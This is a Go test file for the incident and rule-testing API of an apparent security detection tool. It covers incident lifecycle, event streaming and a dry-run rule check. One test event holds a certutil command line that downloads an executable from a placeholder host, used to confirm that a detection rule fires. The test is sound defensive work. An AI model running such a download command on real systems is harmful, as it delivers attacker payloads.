package api

import (
	"bufio"
	"bytes"
	"encoding/json"
	"fmt"
	"net/http"
	"strings"
	"testing"
	"time"

	"github.com/Ruby570bocadito/bluetardigrade/internal/alert"
	"github.com/Ruby570bocadito/bluetardigrade/internal/incident"
	"github.com/Ruby570bocadito/bluetardigrade/internal/rules"
)

func send(t *testing.T, method, url, body string) (*http.Response, []byte) {
	t.Helper()
	req, err := http.NewRequest(method, url, strings.NewReader(body))
	if err != nil {
		t.Fatal(err)
	}
	req.Header.Set("Content-Type", "application/json")
	res, err := http.DefaultClient.Do(req)
	if err != nil {
		t.Fatalf("%s %s: %v", method, url, err)
	}
	defer res.Body.Close()
	var buf bytes.Buffer
	_, _ = buf.ReadFrom(res.Body)
	return res, buf.Bytes()
}

func TestIncidentLifecycleOverHTTP(t *testing.T) {
	h, addr := newTestHub(t)
	base := "http://" + addr
	h.RecordAlert(alert.Alert{ID: "0123456789abcdef", RuleName: "Volcado de LSASS", Severity: "critical", Host: "LAB-WKS-01", Timestamp: time.Now().UTC().Format(time.RFC3339)})
	h.RecordAlert(alert.Alert{ID: "fedcba9876543210", RuleName: "PsExec", Severity: "high", Host: "LAB-WKS-02", Timestamp: time.Now().UTC().Format(time.RFC3339)})

	var list incidentList
	getJSON(t, base+"/api/incidents", &list)
	if len(list.Incidents) != 0 || list.Persistent {
		t.Fatalf("fresh hub must serve an empty, memory-only list: %+v", list)
	}

	res, body := send(t, "POST", base+"/api/incidents",
		`{"title":"Robo de credenciales","by":"ana","alert_ids":["0123456789abcdef","fedcba9876543210"]}`)
	if res.StatusCode != http.StatusCreated {
		t.Fatalf("create: %d %s", res.StatusCode, body)
	}
	var inc incident.Incident
	if err := json.Unmarshal(body, &inc); err != nil {
		t.Fatal(err)
	}
	if inc.Severity != "critical" || len(inc.Hosts) != 2 {
		t.Fatalf("severity and hosts must come from the ring: %+v", inc)
	}

	res, body = send(t, "PATCH", base+"/api/incidents/"+inc.ID, `{"status":"investigating","owner":"ana","by":"ana"}`)
	if res.StatusCode != 200 || !strings.Contains(string(body), `"status":"investigating"`) {
		t.Fatalf("patch: %d %s", res.StatusCode, body)
	}
	res, body = send(t, "POST", base+"/api/incidents/"+inc.ID+"/notes", `{"text":"Equipo aislado","by":"ana"}`)
	if res.StatusCode != 200 || !strings.Contains(string(body), "Equipo aislado") {
		t.Fatalf("note: %d %s", res.StatusCode, body)
	}
	res, _ = send(t, "POST", base+"/api/incidents/"+inc.ID+"/alerts", `{"alert_ids":["0123456789abcdef"],"by":"ana"}`)
	if res.StatusCode != 200 {
		t.Fatalf("add alerts: %d", res.StatusCode)
	}

	var got incident.Incident
	getJSON(t, base+"/api/incidents/"+inc.ID, &got)
	if got.Status != incident.StatusInvestigating || len(got.Timeline) != 4 {
		t.Fatalf("unexpected case after updates: %+v", got)
	}

	for _, tc := range []struct {
		method, path, body string
		code               int
	}{
		{"GET", "/api/incidents/not-an-id", "", 400},
		{"GET", "/api/incidents/0000000000000000", "", 404},
		{"PATCH", "/api/incidents/" + inc.ID, `{"status":"done"}`, 400},
		{"POST", "/api/incidents", `{"title":""}`, 400},
		{"POST", "/api/incidents", `not json`, 400},
		{"POST", "/api/incidents/" + inc.ID + "/notes", `{"text":"  "}`, 400},
		{"POST", "/api/incidents/" + inc.ID + "/alerts", `{"alert_ids":["nope"]}`, 400},
	} {
		if res, body := send(t, tc.method, base+tc.path, tc.body); res.StatusCode != tc.code {
			t.Errorf("%s %s: %d (want %d) %s", tc.method, tc.path, res.StatusCode, tc.code, body)
		}
	}
}

func TestIncidentChangesAreStreamed(t *testing.T) {
	_, addr := newTestHub(t)
	res, err := http.Get("http://" + addr + "/api/stream")
	if err != nil {
		t.Fatal(err)
	}
	defer res.Body.Close()
	frames := make(chan string, 16)
	go func() {
		sc := bufio.NewScanner(res.Body)
		for sc.Scan() {
			frames <- sc.Text()
		}
	}()
	time.Sleep(100 * time.Millisecond)
	if r, body := send(t, "POST", "http://"+addr+"/api/incidents", `{"title":"En directo"}`); r.StatusCode != 201 {
		t.Fatalf("create: %d %s", r.StatusCode, body)
	}
	deadline := time.After(3 * time.Second)
	for {
		select {
		case line := <-frames:
			if line == "event: incident" {
				return
			}
		case <-deadline:
			t.Fatal("no incident frame on the SSE stream")
		}
	}
}

func TestRuleTesterDryRun(t *testing.T) {
	h, addr := newTestHub(t)
	url := "http://" + addr + "/api/rules/test"
	if res, _ := send(t, "POST", url, `{"event":{"type":"process.create"}}`); res.StatusCode != http.StatusServiceUnavailable {
		t.Fatalf("no rule set must answer 503, got %d", res.StatusCode)
	}
	re, err := rules.LoadDir("../../rules")
	if err != nil {
		t.Fatal(err)
	}
	h.SetRules(re)
	ev := `{"event":{"type":"process.create","host":"LAB","process":{"pid":7,"name":"certutil.exe","command_line":"certutil.exe -urlcache -split -f http://x/p.exe p.exe"}}}`
	res, body := send(t, "POST", url, ev)
	if res.StatusCode != 200 {
		t.Fatalf("rule test: %d %s", res.StatusCode, body)
	}
	var out ruleTestResult
	if err := json.Unmarshal(body, &out); err != nil {
		t.Fatal(err)
	}
	if len(out.Matches) != 1 || out.Matches[0].Name != "Descarga con certutil o bitsadmin" || out.Matches[0].Mitre != "T1105" {
		t.Fatalf("unexpected matches %+v", out.Matches)
	}
	if out.Evaluated == 0 || len(out.Matches[0].MatchedOn) == 0 {
		t.Fatalf("result must report evaluated rules and matched fields: %+v", out)
	}
	h.mu.Lock()
	alerts := len(h.alerts)
	h.mu.Unlock()
	if alerts != 0 {
		t.Fatalf("a dry run must not raise alerts (%d)", alerts)
	}
	for body, code := range map[string]int{
		`{"event":{}}`: 400,
		`nope`:         400,
		fmt.Sprintf(`{"event":{"type":"process.create","process":{"name":"x","command_line":%q}}}`, strings.Repeat("a", 40<<10)): 400,
	} {
		if res, _ := send(t, "POST", url, body); res.StatusCode != code {
			t.Errorf("body %.30q: %d, want %d", body, res.StatusCode, code)
		}
	}
}
